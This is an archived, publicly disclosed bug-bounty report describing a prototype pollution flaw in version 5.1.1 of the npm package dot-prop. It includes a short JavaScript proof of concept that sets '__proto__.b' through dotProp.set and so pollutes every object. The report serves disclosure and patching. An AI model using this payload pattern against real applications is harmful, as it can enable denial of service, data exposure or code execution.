# Prototype pollution in dot-prop

## Report Details
- **Report ID**: 719856
- **URL**: https://hackerone.com/reports/719856
- **State**: Closed
- **Severity**: medium
- **Submitted**: 2019-10-22T12:06:11.633Z
- **Disclosed**: 2020-01-28T10:17:51.585Z

## Reporter
- **Username**: aaron_costello
- **Name**: N/A

## Team
- **Name**: N/A
- **Handle**: nodejs-ecosystem

## Vulnerability Information
I would like to report a parameter pollution in dot-prop
It allows an attacker to modify the prototype of a base object which can vary in severity depending on the implementation (DoS, access to sensitive data, RCE).

# Module

**module name:** dot-prop
**version:** 5.1.1
**npm page:** https://www.npmjs.com/package/dot-prop

## Module Description

Get, set, or delete a property from a nested object using a dot path

## Module Stats

weekly downloads:
8,627,892

# Vulnerability

## Vulnerability Description

See previous description

## Steps To Reproduce:

```
var dotProp = require("dot-prop")
const object = {};
console.log("Before " + object.b); //Undefined
dotProp.set(object, '__proto__.b', true);
console.log("After " + {}.b); //true
```

# Wrap up

> Select Y or N for the following statements:

- I contacted the maintainer to let them know: N
- I opened an issue in the related repository: N

## Impact

Can result in: dos, access to restricted data, rce (depends on implementation)

## Attachments
No attachments
